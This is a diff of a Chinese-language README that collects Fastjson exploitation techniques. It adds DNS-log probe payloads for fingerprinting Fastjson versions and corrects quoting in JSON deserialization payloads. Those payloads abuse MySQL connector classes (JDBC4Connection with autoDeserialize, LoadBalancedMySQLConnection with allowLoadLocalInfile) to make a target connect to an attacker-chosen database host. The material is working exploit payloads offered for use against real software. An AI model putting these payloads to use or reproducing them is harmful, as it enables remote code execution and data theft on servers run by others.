@@ -3,20 +3,22 @@
 Fastjson姿势技巧集合
 
 ## 说明
-2021.8.10 小弟水平有限，1.2.48之后高版本漏洞成因还未进行研究探索，很多利用细节和注意事项都不够完整，待我有空慢慢补充。
-
+高版本的一些细节还有待更新。本项目涉及的一些姿势和payload是从之前的随手记的笔记直接粘进来的，很多找不到出处了所以来源未贴出来，忘师傅们见谅。
 
 ## 探测
 
 用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。   
 fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。   
 
-主要是利用各个类被加入黑名单的方式进行判断
+主要是利用各个类被加入黑名单的方式进行判断   
+
+重点关注MiscCodec处理时会去触发dns查询   
 
 fastjson >1.2.43
 
 ```java
-{"@type":"java.net.URL","val":"dnslog"}
+{"@type":"java.net.URL","val":"http://dnslog"}
+{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
 ```
 
 fastjson >1.2.48
@@ -732,7 +734,7 @@ poc:
 详细漏洞原理待研究
 ```java
 Mysqlconnector 5.1.x
-{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":”pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":”dbname","url":""}
+{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
 
 Mysqlconnector 6.0.2 or 6.0.3
 {"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}
